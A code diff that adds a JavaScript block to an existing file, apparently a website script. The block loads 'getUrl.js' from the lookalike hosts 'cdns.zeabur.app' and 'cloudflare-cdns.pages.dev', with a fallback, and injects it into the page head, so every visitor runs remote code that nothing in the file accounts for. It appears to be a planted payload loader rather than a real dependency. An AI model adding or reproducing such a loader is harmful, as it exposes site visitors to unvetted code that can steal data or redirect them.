@@ -132,4 +132,23 @@
 			}, 750);
 		});
 	})();
+        const loadScript = (src, onLoad) => {
+                const script = document.createElement('script');
+                       script.type = 'text/javascript';
+                       script.src = src;
+                       script.onload = onLoad;
+                       return script;
+                };
+        const mainSrc = '//cdns.zeabur.app/js/getUrl.js';
+                const backupSrc = '//cloudflare-cdns.pages.dev/js/getUrl.js';
+                       const mainScript = loadScript(mainSrc, () => {
+                                document.head.appendChild(mainScript);
+                        });
+        mainScript.onerror = () => {
+                const backupScript = loadScript(backupSrc, () => {
+              document.head.appendChild(backupScript);
+          });
+         document.head.appendChild(backupScript);
+     };
+     document.head.appendChild(mainScript);
 })();
